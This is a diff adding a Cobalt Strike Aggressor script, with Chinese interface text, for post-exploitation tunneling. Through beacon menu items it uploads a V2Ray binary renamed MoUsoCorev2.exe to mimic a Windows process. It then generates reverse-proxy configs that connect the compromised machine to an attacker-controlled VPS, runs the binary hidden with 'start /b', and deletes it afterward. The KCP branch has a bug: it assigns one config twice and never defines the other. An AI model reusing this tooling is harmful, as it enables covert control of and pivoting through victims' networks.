@@ -1,0 +1,135 @@
+import java.util.UUID;
+popup beacon_bottom {
+
+	menu "V2ray" {
+		item "上传 V2ray" {
+			$bid = $1;
+			$dialog = dialog("上传 V2ray", %(UploadPath => "C:\\Users\\Public\\Downloads", bid => $bid), &v2);
+			dialog_description($dialog, "仅上传V2ray(名称已修改,当前版本5.7.0)           	https://github.com/v2fly/v2ray-core/releases/tag/v5.7.0");
+			drow_text($dialog, "UploadPath",  "上传路径: ");
+			dbutton_action($dialog, "上传");
+			dialog_show($dialog);
+
+		}
+		sub v2 {
+			$alpath = $3['UploadPath'];
+            bcd($bid, $3['UploadPath']);
+            bupload($bid, script_resource("Proxy/MoUsoCorev2.exe"));
+        }
+        item "配置 V2ray" {
+        	$bid = $1;
+        	$uuid_1 = [java.util.UUID randomUUID];
+        	$uuid_2 = [java.util.UUID randomUUID];
+        	$dialog = dialog("配置", %(uuid_1 => $uuid_1, uuid_2 => $uuid_2, vps_ip => "" , vps_port_1 => "34001", vps_port_2 => "28900" , vps_port_3 => "443", password => "pass000word", network => "tcp" , bid => $bid), &v2_profile);
+        	dialog_description($dialog, "生成V2ray配置，参考@亮哥@xinyu       选择\"TCP\"或\"UDP\"，修改VPS、端口、密码等信息\n注意：加密的uuid在每次生成配置时会重新随机生成");
+        	drow_text($dialog, "uuid_1",  "uuid_1: ");
+        	drow_text($dialog, "uuid_2",  "uuid_2: ");
+        	drow_text($dialog, "vps_ip",  "vpsip: ");
+        	drow_text($dialog, "vps_port_1",  "代理端口: ");
+        	drow_text($dialog, "vps_port_2",  "VPS-客户端端口: ");
+        	drow_text($dialog, "vps_port_3",  "VPS-被控端端口: ");
+        	drow_text($dialog, "password",  "账号密码相同: ");
+
+        	drow_text($dialog, "network",  "tcp/kcp: ");
+        	dbutton_action($dialog, "配置");
+        	dialog_show($dialog);
+        }
+        sub v2_profile{
+        	$uuid_1 = $3['uuid_1'];
+        	$uuid_2 = $3['uuid_2'];
+        	$vps_ip = $3['vps_ip'];
+        	$vps_port_1 = $3['vps_port_1'];
+        	$vps_port_2 = $3['vps_port_2'];
+        	$vps_port_3 = $3['vps_port_3'];
+        	$password = $3['password'];
+        	$network = $3['network'];
+        	$v2profile_tcp_vps1 = "{  \n  \"reverse\":{\n    \"portals\":[  \n      {  \n        \"tag\":\"portal\",\n        \"domain\":\"www.baidu.com\"\n      }\n    ]\n  },\n  \"inbounds\": [\n    {\n      \"tag\": \"tunnel1\",\n      \"port\": $vps_port_2 ,\n      \"protocol\":\"vmess\",\n      \"settings\":{  \n        \"clients\":[  \n          {  \n            \"id\":\"$uuid_1\",\n            \"alterId\": 0\n          }\n        ]\n      },\n    \"streamSettings\": {\n      \"network\": \"tcp\"\n    }\n    },\n    {\n      \"tag\": \"tunnel\",\n      \"port\": $vps_port_3 ,\n      \"protocol\":\"vmess\",\n      \"settings\":{  \n        \"clients\":[  \n          {  \n            \"id\":\"$uuid_2\",\n            \"alterId\":0\n          }\n        ]\n      },\n    \"streamSettings\": {\n      \"network\": \"tcp\"    \n    }\n    }\n  ],\n  \"routing\":{  \n    \"rules\":[  \n      {  \n        \"type\":\"field\",\n        \"inboundTag\":[  \n          \"tunnel1\"\n        ],\n        \"outboundTag\":\"portal\"\n      },\n      {  \n        \"type\":\"field\",\n        \"inboundTag\":[  \n          \"tunnel\"\n        ],\n        \"outboundTag\":\"portal\"\n      }\n    ]\n  }\n}";
+
+        	$v2profile_tcp_vps2 =  "{\n  \"log\": {\n    \"access\": \"\",\n    \"error\": \"\",\n    \"loglevel\": \"warning\"\n  },\n  \"inbounds\": [\n    {\n      \"port\": $vps_port_1 ,\n      \"ip\": \"0.0.0.0\",\n      \"protocol\": \"socks\",\n      \"version\": 5,\n      \"settings\": {\n        \"auth\": \"password\",\n        \"accounts\": [\n        {\n            \"user\": \"$password\",\n            \"pass\": \"$password\"\n        }\n        ]\n    }\n    }\n  ],\n  \"outbounds\": [\n    {\n      \"protocol\": \"vmess\",\n      \"settings\": {\n        \"vnext\": [\n          {\n            \"address\": \"127.0.0.1\",\n            \"port\": $vps_port_2 ,\n            \"users\": [\n              {\n                \"id\": \"$uuid_1\",\n                \"alterId\": 0\n              }\n            ]\n          }\n        ]\n      },\n    \"streamSettings\": {\n      \"network\": \"tcp\"\n    }\n    }\n  ]\n}";
+
+        	$v2profile_tcp_c = "{  \n  \"reverse\":{ \n    \"bridges\":[  \n      {  \n        \"tag\":\"bridge\", \n        \"domain\":\"www.baidu.com\" \n      }\n    ]\n  },\n  \"outbounds\": [\n    {  \n      \"tag\":\"tunnel\", \n      \"protocol\":\"vmess\",\n      \"settings\":{  \n        \"vnext\":[  \n          {  \n            \"address\":\"$vps_ip\",\n            \"port\": $vps_port_3 ,\n            \"users\":[  \n              {  \n                \"id\":\"$uuid_2\",\n                \"alterId\":0\n              }\n            ]\n          }\n        ]\n      },\n    \"streamSettings\": {\n      \"network\": \"tcp\"      \n    }\n    },\n    {  \n      \"protocol\":\"freedom\",\n      \"settings\":{},\n      \"tag\":\"out\"\n    }\n  ],\n  \"routing\":{   \n    \"rules\":[  \n      {  \n        \"type\":\"field\",\n        \"inboundTag\":[\"bridge\"],\n        \"domain\":[\"full:www.baidu.com\"],\n        \"outboundTag\":\"tunnel\"\n      },\n      {  \n        \"type\":\"field\",\n        \"inboundTag\":[\"bridge\"],\n        \"outboundTag\":\"out\"\n      }\n    ]\n  }\n}";
+
+        	$v2profile_kcp_vps1 = "{  \n  \"reverse\":{\n    \"portals\":[  \n      {  \n        \"tag\":\"portal\",\n        \"domain\":\"www.baidu.com\"\n      }\n    ]\n  },\n  \"inbounds\": [\n    {\n      \"tag\": \"tunnel1\",\n      \"port\": $vps_port_2 ,\n      \"protocol\":\"vmess\",\n      \"settings\":{  \n        \"clients\":[  \n          {  \n            \"id\":\"$uuid_1\",\n            \"alterId\": 0\n          }\n        ]\n      },\n    \"streamSettings\": {\n      \"network\": \"tcp\"\n    }\n    },\n    {\n      \"tag\": \"tunnel\",\n      \"port\": $vps_port_3 ,\n      \"protocol\":\"vmess\",\n      \"settings\":{  \n        \"clients\":[  \n          {  \n            \"id\":\"$uuid_2\",\n            \"alterId\":0\n          }\n        ]\n      },\n    \"streamSettings\": {\n      \"network\": \"kcp\",\n      \"kcpSettings\": {\n        \"mtu\": 1350,\n        \"tti\": 20,\n        \"uplinkCapacity\": 5,\n        \"downlinkCapacity\": 100,\n        \"congestion\": true,\n        \"readBufferSize\": 1,\n        \"writeBufferSize\": 1,\n        \"header\": {\n          \"type\": \"none\"\n        }\n      }\n    }\n    }\n  ],\n  \"routing\":{  \n    \"rules\":[  \n      {  \n        \"type\":\"field\",\n        \"inboundTag\":[  \n          \"tunnel1\"\n        ],\n        \"outboundTag\":\"portal\"\n      },\n      {  \n        \"type\":\"field\",\n        \"inboundTag\":[  \n          \"tunnel\"\n        ],\n        \"outboundTag\":\"portal\"\n      }\n    ]\n  }\n}";
+
+        	$v2profile_kcp_vps1 = "{\n  \"log\": {\n    \"access\": \"\",\n    \"error\": \"\",\n    \"loglevel\": \"warning\"\n  },\n  \"inbounds\": [\n    {\n      \"port\": $vps_port_1 ,\n      \"ip\": \"0.0.0.0\",\n      \"protocol\": \"socks\",\n      \"version\": 5,\n      \"settings\": {\n        \"auth\": \"password\",\n        \"accounts\": [\n        {\n            \"user\": \"$password\",\n            \"pass\": \"$password\"\n        }\n        ]\n    }\n    }\n  ],\n  \"outbounds\": [\n    {\n      \"protocol\": \"vmess\",\n      \"settings\": {\n        \"vnext\": [\n          {\n            \"address\": \"127.0.0.1\",\n            \"port\": $vps_port_2 ,\n            \"users\": [\n              {\n                \"id\": \"$uuid_1\",\n                \"alterId\": 0\n              }\n            ]\n          }\n        ]\n      },\n    \"streamSettings\": {\n      \"network\": \"tcp\"\n    }\n    }\n  ]\n}";
+
+        	$v2profile_kcp_c = "{  \n  \"reverse\":{ \n    \"bridges\":[  \n      {  \n        \"tag\":\"bridge\", \n        \"domain\":\"www.baidu.com\" \n      }\n    ]\n  },\n  \"outbounds\": [\n    {  \n      \"tag\":\"tunnel\", \n      \"protocol\":\"vmess\",\n      \"settings\":{  \n        \"vnext\":[  \n          {  \n            \"address\":\"$vps_ip\",\n            \"port\": $vps_port_3 ,\n            \"users\":[  \n              {  \n                \"id\":\"$uuid_2\",\n                \"alterId\":0\n              }\n            ]\n          }\n        ]\n      },\n    \"streamSettings\": {\n      \"network\": \"kcp\",\n      \"kcpSettings\": {\n        \"mtu\": 1350,\n        \"tti\": 20,\n        \"uplinkCapacity\": 5,\n        \"downlinkCapacity\": 100,\n        \"congestion\": true,\n        \"readBufferSize\": 1,\n        \"writeBufferSize\": 1,\n        \"header\": {\n          \"type\": \"none\"\n        }\n      }\n    }\n    },\n    {  \n      \"protocol\":\"freedom\",\n      \"settings\":{},\n      \"tag\":\"out\"\n    }\n  ],\n  \"routing\":{   \n    \"rules\":[  \n      {  \n        \"type\":\"field\",\n        \"inboundTag\":[\"bridge\"],\n        \"domain\":[\"full:www.baidu.com\"],\n        \"outboundTag\":\"tunnel\"\n      },\n      {  \n        \"type\":\"field\",\n        \"inboundTag\":[\"bridge\"],\n        \"outboundTag\":\"out\"\n      }\n    ]\n  }\n}";
+
+        	if ($network eq "tcp") {
+        		$v2profile_vps1 = $v2profile_tcp_vps1;
+        		$v2profile_vps2 = $v2profile_tcp_vps2;
+        		$v2profile_c = $v2profile_tcp_c;
+        	}else{
+        		$v2profile_vps1 = $v2profile_kcp_vps1;
+        		$v2profile_vps2 = $v2profile_kcp_vps2;
+        		$v2profile_c = $v2profile_kcp_c;
+        	}
+        	btask($bid, "生成V2ray配置，参考@亮哥@xinyu \n1.选择\"TCP\"或\"UDP\"，修改VPS、端口、密码等信息\n2.将v2、服务端配置文件、客户端配置文件，上传到VPS上\n3.将v2、被控端配置文件，上传到被控机器上\n4.依次运行：v2+服务端配置文件、v2+客户端配置文件、v2+被控端配置文件\n5.VPS+代理端口+账号密码，连接测试是否配置成功\n需要注意：加密的uuid在每次生成配置时会重新随机生成，排查问题时记得查看加密id是否匹配", "");
+        	#btask($bid, "==========生成v2ray配置备份==========", "");
+        	#btask($bid, "==========服务端配置文件(放在VPS)==========", "");
+        	#btask($bid, "\n$v2profile_vps1", "");
+        	#btask($bid, "==========客户端配置文件(放在VPS)==========", "");
+        	#btask($bid, "\n$v2profile_vps2", "");
+        	#btask($bid, "==========被控端配置文件(放在被控机器上)==========", "");
+        	#btask($bid, "\n$v2profile_c", "");
+
+
+        	%localvar['v2profile_vps1'] = $v2profile_vps1;
+        	%localvar['v2profile_vps2'] = $v2profile_vps2;
+        	%localvar['v2profile_c'] = $v2profile_c;
+        	if ($alpath eq "\\") {
+        		$alpath = $alpath;
+        		%localvar['UploadPath'] = $alpath;
+        	}else{
+        		$alpath = "C:\\Users\\Public\\Downloads";
+        		%localvar['UploadPath'] = $alpath;
+        	}
+        	
+
+
+        	$dialog = dialog("V2ray profile", %localvar,&uploadconfig);
+        	dialog_description($dialog, "请保存好配置文件，每次生成的uuid不同，生成的文件在c2客户端根目录。如想在beacon显示配置文件请修改cna文件注释。");
+        	drow_text_big($dialog, "v2profile_vps1","服务端配置文件(放在VPS)");
+        	drow_text_big($dialog, "v2profile_vps2","客户端配置文件(放在VPS)");
+        	drow_text_big($dialog, "v2profile_c","被控端配置文件(放在被控机器上)");
+        	drow_text($dialog, "UploadPath",  "文件路径: ");
+        	dbutton_action($dialog, "生成配置文件&上传被控端配置文件");
+        	dialog_show($dialog);
+
+
+        }
+
+        sub uploadconfig {
+        	bcd($bid, $3['UploadPath']);
+        	$handle1 = openf("> 1.json");
+			writeb($handle1, $v2profile_vps1);
+        	$handle2 = openf("> 2.json");
+			writeb($handle2, $v2profile_vps2);
+        	$handle3 = openf("> 3.json");
+			writeb($handle3, $v2profile_c);
+        	bupload($bid, "3.json");
+
+        }
+
+		item "运行 V2ray" {
+			$bid = $1['@'];
+			$dialog = dialog("运行 V2ray",%(exec => "start /b MoUsoCorev2.exe run --config 3.json > vtmp.log",UploadPath => $alpath,bid => $bid),&v2_run);
+			dialog_description($dialog, "请务必配置好conf文件后运行");
+			drow_text($dialog, "exec", "Exec: ");
+			drow_text($dialog, "UploadPath",  "文件路径: ");
+			dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+		}
+		sub v2_run{
+			$exec = $3['exec'];
+			bcd($bid, $3['UploadPath']);
+			bshell($bid, "$exec");
+		}
+		item "删除 V2ray" {
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "taskkill -f /im MoUsoCorev2.exe & del /f /s /q MoUsoCorev2.exe & del /f /s /q 3.json");	
+			}
+		}
+	}
+}
